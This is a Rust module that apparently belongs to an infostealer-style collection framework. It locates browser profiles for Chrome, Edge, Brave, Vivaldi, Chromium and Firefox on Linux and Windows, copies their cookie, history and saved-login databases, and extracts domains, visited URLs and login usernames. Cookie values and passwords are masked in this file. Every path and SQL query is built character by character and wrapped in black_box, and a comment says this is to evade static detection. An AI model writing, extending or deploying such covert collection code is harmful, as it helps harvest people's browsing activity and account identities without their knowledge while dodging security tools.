//! Browser data collector
//!
//! ⚠️ Todas as strings são ofuscadas para evitar detecção estática.

use std::path::PathBuf;
use std::hint::black_box;
use serde::{Deserialize, Serialize};
use rusqlite::{Connection, OpenFlags};

use super::{Collector, CollectorError, ModuleData};

// ============================================================================
// STRING OBFUSCATION HELPERS
// ============================================================================

#[inline(always)]
fn xd(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

// ============================================================================
// DATA STRUCTURES (serde rename para nomes curtos)
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserData {
    #[serde(rename = "b")]
    pub browsers_found: Vec<String>,
    #[serde(rename = "p")]
    pub profiles: Vec<BrowserProfile>,
    #[serde(rename = "c")]
    pub total_cookies: u32,
    #[serde(rename = "w")]
    pub total_passwords: u32,
    #[serde(rename = "h")]
    pub total_history: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserProfile {
    #[serde(rename = "b")]
    pub browser: String,
    #[serde(rename = "n")]
    pub profile_name: String,
    #[serde(rename = "p")]
    pub profile_path: String,
    #[serde(rename = "c")]
    pub cookies: Vec<CookieEntry>,
    #[serde(rename = "h")]
    pub history: Vec<HistoryEntry>,
    #[serde(rename = "w")]
    pub passwords: Vec<PasswordEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CookieEntry {
    #[serde(rename = "d")]
    pub domain: String,
    #[serde(rename = "n")]
    pub name: String,
    #[serde(rename = "v")]
    pub value: String,
    #[serde(rename = "e")]
    pub expires: Option<String>,
    #[serde(rename = "s")]
    pub is_secure: bool,
    #[serde(rename = "h")]
    pub is_http_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistoryEntry {
    #[serde(rename = "u")]
    pub url: String,
    #[serde(rename = "t")]
    pub title: String,
    #[serde(rename = "c")]
    pub visit_count: u32,
    #[serde(rename = "l")]
    pub last_visit: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PasswordEntry {
    #[serde(rename = "u")]
    pub url: String,
    #[serde(rename = "n")]
    pub username: String,
    #[serde(rename = "p")]
    pub password: String,
    #[serde(rename = "c")]
    pub created: String,
}

struct BrowserPath {
    name: String,
    path: PathBuf,
    is_chromium: bool,
}

pub struct BrowserCollector {
    browsers: Vec<BrowserPath>,
}

impl BrowserCollector {
    pub fn new() -> Self {
        Self {
            browsers: Self::find_browsers(),
        }
    }
    
    fn find_browsers() -> Vec<BrowserPath> {
        let mut found = Vec::new();
        
        #[cfg(target_os = "linux")]
        {
            if let Some(home) = dirs::home_dir() {
                // Cada path é construído char por char
                let paths = [
                    (bs(&['C']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'g', 'o', 'o', 'g', 'l', 'e', '-', 'c', 'h', 'r', 'o', 'm', 'e'])), true),
                    (bs(&['M']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'c', 'h', 'r', 'o', 'm', 'i', 'u', 'm'])), true),
                    (bs(&['B']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'B', 'r', 'a', 'v', 'e', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '/', 'B', 'r', 'a', 'v', 'e', '-', 'B', 'r', 'o', 'w', 's', 'e', 'r'])), true),
                    (bs(&['E']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'm', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '-', 'e', 'd', 'g', 'e'])), true),
                    (bs(&['V']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'v', 'i', 'v', 'a', 'l', 'd', 'i'])), true),
                    (bs(&['F']), home.join(bs(&['.', 'm', 'o', 'z', 'i', 'l', 'l', 'a', '/', 'f', 'i', 'r', 'e', 'f', 'o', 'x'])), false),
                ];
                
                for (name, path, is_chromium) in paths {
                    if path.exists() {
                        found.push(BrowserPath { name, path, is_chromium });
                    }
                }
            }
        }
        
        #[cfg(target_os = "windows")]
        {
            if let Some(local) = dirs::data_local_dir() {
                let paths = [
                    // Chrome
                    (bs(&['C']), {
                        let mut p = local.clone();
                        p.push(bs(&['G', 'o', 'o', 'g', 'l', 'e']));
                        p.push(bs(&['C', 'h', 'r', 'o', 'm', 'e']));
                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
                        p
                    }, true),
                    // Edge
                    (bs(&['E']), {
                        let mut p = local.clone();
                        p.push(bs(&['M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't']));
                        p.push(bs(&['E', 'd', 'g', 'e']));
                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
                        p
                    }, true),
                    // Brave
                    (bs(&['B']), {
                        let mut p = local.clone();
                        p.push(bs(&['B', 'r', 'a', 'v', 'e', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e']));
                        p.push(bs(&['B', 'r', 'a', 'v', 'e', '-', 'B', 'r', 'o', 'w', 's', 'e', 'r']));
                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
                        p
                    }, true),
                    // Vivaldi
                    (bs(&['V']), {
                        let mut p = local.clone();
                        p.push(bs(&['V', 'i', 'v', 'a', 'l', 'd', 'i']));
                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
                        p
                    }, true),
                ];
                
                for (name, path, is_chromium) in paths {
                    if path.exists() {
                        found.push(BrowserPath { name, path, is_chromium });
                    }
                }
            }
            
            if let Some(roaming) = dirs::config_dir() {
                // Firefox
                let mut ff_path = roaming.clone();
                ff_path.push(bs(&['M', 'o', 'z', 'i', 'l', 'l', 'a']));
                ff_path.push(bs(&['F', 'i', 'r', 'e', 'f', 'o', 'x']));
                ff_path.push(bs(&['P', 'r', 'o', 'f', 'i', 'l', 'e', 's']));
                
                if ff_path.exists() {
                    found.push(BrowserPath {
                        name: bs(&['F']),
                        path: ff_path,
                        is_chromium: false,
                    });
                }
            }
        }
        
        found
    }
    
    fn collect_all(&self) -> Result<BrowserData, CollectorError> {
        let browsers_found: Vec<String> = self.browsers.iter()
            .map(|b| b.name.clone())
            .collect();
        
        let mut profiles = Vec::new();
        let mut total_cookies = 0u32;
        let mut total_passwords = 0u32;
        let mut total_history = 0u32;
        
        for browser in &self.browsers {
            if browser.is_chromium {
                if let Ok(profs) = self.collect_chromium(browser) {
                    for p in profs {
                        total_cookies += p.cookies.len() as u32;
                        total_passwords += p.passwords.len() as u32;
                        total_history += p.history.len() as u32;
                        profiles.push(p);
                    }
                }
            } else {
                if let Ok(profs) = self.collect_firefox(browser) {
                    for p in profs {
                        total_cookies += p.cookies.len() as u32;
                        total_history += p.history.len() as u32;
                        profiles.push(p);
                    }
                }
            }
        }
        
        Ok(BrowserData {
            browsers_found,
            profiles,
            total_cookies,
            total_passwords,
            total_history,
        })
    }
    
    fn collect_chromium(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
        let mut profiles = Vec::new();
        
        // Profile dirs construídos em runtime
        let profile_dirs = [
            bs(&['D', 'e', 'f', 'a', 'u', 'l', 't']),
            bs(&['P', 'r', 'o', 'f', 'i', 'l', 'e', ' ', '1']),
            bs(&['P', 'r', 'o', 'f', 'i', 'l', 'e', ' ', '2']),
        ];
        
        for profile_name in profile_dirs {
            let profile_path = browser.path.join(&profile_name);
            if !profile_path.exists() {
                continue;
            }
            
            let mut profile = BrowserProfile {
                browser: browser.name.clone(),
                profile_name: profile_name.clone(),
                profile_path: profile_path.to_string_lossy().to_string(),
                cookies: Vec::new(),
                history: Vec::new(),
                passwords: Vec::new(),
            };
            
            // Cookies db
            let cookies_db = profile_path.join(bs(&['C', 'o', 'o', 'k', 'i', 'e', 's']));
            if cookies_db.exists() {
                if let Ok(cookies) = self.read_chromium_cookies(&cookies_db) {
                    profile.cookies = cookies;
                }
            }
            
            // History db
            let history_db = profile_path.join(bs(&['H', 'i', 's', 't', 'o', 'r', 'y']));
            if history_db.exists() {
                if let Ok(history) = self.read_chromium_history(&history_db) {
                    profile.history = history;
                }
            }
            
            // Login Data db
            let login_db = profile_path.join(bs(&['L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a']));
            if login_db.exists() {
                if let Ok(logins) = self.read_chromium_logins(&login_db) {
                    profile.passwords = logins;
                }
            }
            
            if !profile.cookies.is_empty() || !profile.history.is_empty() || !profile.passwords.is_empty() {
                profiles.push(profile);
            }
        }
        
        Ok(profiles)
    }
    
    fn read_chromium_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("c_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let query = Self::build_cookies_query();
        let mut stmt = conn.prepare(&query)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
            Ok(CookieEntry {
                domain: row.get(0)?,
                name: row.get(1)?,
                value: bs(&['*']),
                expires: row.get::<_, i64>(3).ok().map(|v| {
                    chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }),
                is_secure: row.get::<_, i32>(4).unwrap_or(0) == 1,
                is_http_only: row.get::<_, i32>(5).unwrap_or(0) == 1,
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(cookies)
    }
    
    fn read_chromium_history(&self, db_path: &PathBuf) -> Result<Vec<HistoryEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("h_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let query = Self::build_history_query();
        let mut stmt = conn.prepare(&query)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let history: Vec<HistoryEntry> = stmt.query_map([], |row| {
            Ok(HistoryEntry {
                url: row.get(0)?,
                title: row.get::<_, String>(1).unwrap_or_default(),
                visit_count: row.get::<_, i32>(2).unwrap_or(0) as u32,
                last_visit: row.get::<_, i64>(3).ok().map(|v| {
                    chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }).unwrap_or_default(),
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(history)
    }
    
    fn read_chromium_logins(&self, db_path: &PathBuf) -> Result<Vec<PasswordEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("l_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let query = Self::build_logins_query();
        let mut stmt = conn.prepare(&query)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let logins: Vec<PasswordEntry> = stmt.query_map([], |row| {
            Ok(PasswordEntry {
                url: row.get(0)?,
                username: row.get::<_, String>(1).unwrap_or_default(),
                password: bs(&['*']),
                created: row.get::<_, i64>(2).ok().map(|v| {
                    chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }).unwrap_or_default(),
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(logins)
    }
    
    fn collect_firefox(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
        let mut profiles = Vec::new();
        
        if let Ok(entries) = std::fs::read_dir(&browser.path) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    // places.sqlite
                    let places = path.join(bs(&['p', 'l', 'a', 'c', 'e', 's', '.', 's', 'q', 'l', 'i', 't', 'e']));
                    if places.exists() {
                        let mut profile = BrowserProfile {
                            browser: bs(&['F']),
                            profile_name: entry.file_name().to_string_lossy().to_string(),
                            profile_path: path.to_string_lossy().to_string(),
                            cookies: Vec::new(),
                            history: Vec::new(),
                            passwords: Vec::new(),
                        };
                        
                        if let Ok(history) = self.read_firefox_history(&places) {
                            profile.history = history;
                        }
                        
                        // cookies.sqlite
                        let cookies_db = path.join(bs(&['c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q', 'l', 'i', 't', 'e']));
                        if let Ok(cookies) = self.read_firefox_cookies(&cookies_db) {
                            profile.cookies = cookies;
                        }
                        
                        if !profile.history.is_empty() || !profile.cookies.is_empty() {
                            profiles.push(profile);
                        }
                    }
                }
            }
        }
        
        Ok(profiles)
    }
    
    fn read_firefox_history(&self, db_path: &PathBuf) -> Result<Vec<HistoryEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("fp_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let query = Self::build_firefox_history_query();
        let mut stmt = conn.prepare(&query)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let history: Vec<HistoryEntry> = stmt.query_map([], |row| {
            Ok(HistoryEntry {
                url: row.get(0)?,
                title: row.get::<_, String>(1).unwrap_or_default(),
                visit_count: row.get::<_, i32>(2).unwrap_or(0) as u32,
                last_visit: row.get::<_, i64>(3).ok().map(|v| {
                    chrono::DateTime::from_timestamp(v / 1_000_000, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }).unwrap_or_default(),
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(history)
    }
    
    fn read_firefox_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
        if !db_path.exists() {
            return Ok(Vec::new());
        }
        
        let tmp = std::env::temp_dir().join(format!("fc_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let query = Self::build_firefox_cookies_query();
        let mut stmt = conn.prepare(&query)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
            Ok(CookieEntry {
                domain: row.get(0)?,
                name: row.get(1)?,
                value: bs(&['*']),
                expires: row.get::<_, i64>(3).ok().map(|v| {
                    chrono::DateTime::from_timestamp(v, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }),
                is_secure: row.get::<_, i32>(4).unwrap_or(0) == 1,
                is_http_only: row.get::<_, i32>(5).unwrap_or(0) == 1,
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(cookies)
    }
    
    // ========================================================================
    // SQL QUERY BUILDERS (Anti-static analysis)
    // ========================================================================
    
    fn build_cookies_query() -> String {
        let mut q = String::with_capacity(100);
        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
        for c in ['h', 'o', 's', 't', '_', 'k', 'e', 'y', ',', ' '] { q.push(c); }
        for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
        for c in ['v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
        for c in ['e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't', 'c', ',', ' '] { q.push(c); }
        for c in ['i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e', ',', ' '] { q.push(c); }
        for c in ['i', 's', '_', 'h', 't', 't', 'p', 'o', 'n', 'l', 'y', ' '] { q.push(c); }
        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
        for c in ['c', 'o', 'o', 'k', 'i', 'e', 's', ' '] { q.push(c); }
        for c in ['L', 'I', 'M', 'I', 'T', ' ', '1', '0', '0'] { q.push(c); }
        black_box(q)
    }
    
    fn build_history_query() -> String {
        let mut q = String::with_capacity(100);
        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
        for c in ['u', 'r', 'l', ',', ' '] { q.push(c); }
        for c in ['t', 'i', 't', 'l', 'e', ',', ' '] { q.push(c); }
        for c in ['v', 'i', 's', 'i', 't', '_', 'c', 'o', 'u', 'n', 't', ',', ' '] { q.push(c); }
        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 't', 'i', 'm', 'e', ' '] { q.push(c); }
        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
        for c in ['u', 'r', 'l', 's', ' '] { q.push(c); }
        for c in ['O', 'R', 'D', 'E', 'R', ' ', 'B', 'Y', ' '] { q.push(c); }
        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 't', 'i', 'm', 'e', ' '] { q.push(c); }
        for c in ['D', 'E', 'S', 'C', ' '] { q.push(c); }
        for c in ['L', 'I', 'M', 'I', 'T', ' ', '5', '0'] { q.push(c); }
        black_box(q)
    }
    
    fn build_logins_query() -> String {
        let mut q = String::with_capacity(80);
        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
        for c in ['o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', ',', ' '] { q.push(c); }
        for c in ['u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
        for c in ['d', 'a', 't', 'e', '_', 'c', 'r', 'e', 'a', 't', 'e', 'd', ' '] { q.push(c); }
        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
        for c in ['l', 'o', 'g', 'i', 'n', 's', ' '] { q.push(c); }
        for c in ['L', 'I', 'M', 'I', 'T', ' ', '5', '0'] { q.push(c); }
        black_box(q)
    }
    
    fn build_firefox_history_query() -> String {
        let mut q = String::with_capacity(120);
        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
        for c in ['u', 'r', 'l', ',', ' '] { q.push(c); }
        for c in ['t', 'i', 't', 'l', 'e', ',', ' '] { q.push(c); }
        for c in ['v', 'i', 's', 'i', 't', '_', 'c', 'o', 'u', 'n', 't', ',', ' '] { q.push(c); }
        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 'd', 'a', 't', 'e', ' '] { q.push(c); }
        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
        for c in ['m', 'o', 'z', '_', 'p', 'l', 'a', 'c', 'e', 's', ' '] { q.push(c); }
        for c in ['W', 'H', 'E', 'R', 'E', ' '] { q.push(c); }
        for c in ['v', 'i', 's', 'i', 't', '_', 'c', 'o', 'u', 'n', 't', ' ', '>', ' ', '0', ' '] { q.push(c); }
        for c in ['O', 'R', 'D', 'E', 'R', ' ', 'B', 'Y', ' '] { q.push(c); }
        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 'd', 'a', 't', 'e', ' '] { q.push(c); }
        for c in ['D', 'E', 'S', 'C', ' '] { q.push(c); }
        for c in ['L', 'I', 'M', 'I', 'T', ' ', '5', '0'] { q.push(c); }
        black_box(q)
    }
    
    fn build_firefox_cookies_query() -> String {
        let mut q = String::with_capacity(100);
        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
        for c in ['h', 'o', 's', 't', ',', ' '] { q.push(c); }
        for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
        for c in ['v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
        for c in ['e', 'x', 'p', 'i', 'r', 'y', ',', ' '] { q.push(c); }
        for c in ['i', 's', 'S', 'e', 'c', 'u', 'r', 'e', ',', ' '] { q.push(c); }
        for c in ['i', 's', 'H', 't', 't', 'p', 'O', 'n', 'l', 'y', ' '] { q.push(c); }
        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
        for c in ['m', 'o', 'z', '_', 'c', 'o', 'o', 'k', 'i', 'e', 's', ' '] { q.push(c); }
        for c in ['L', 'I', 'M', 'I', 'T', ' ', '1', '0', '0'] { q.push(c); }
        black_box(q)
    }
}

impl Default for BrowserCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for BrowserCollector {
    fn name(&self) -> &str {
        "b"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.collect_all()?;
        Ok(ModuleData::Browser(data))
    }
    
    fn is_supported(&self) -> bool {
        !self.browsers.is_empty()
    }
    
    fn priority(&self) -> u8 {
        90
    }
}
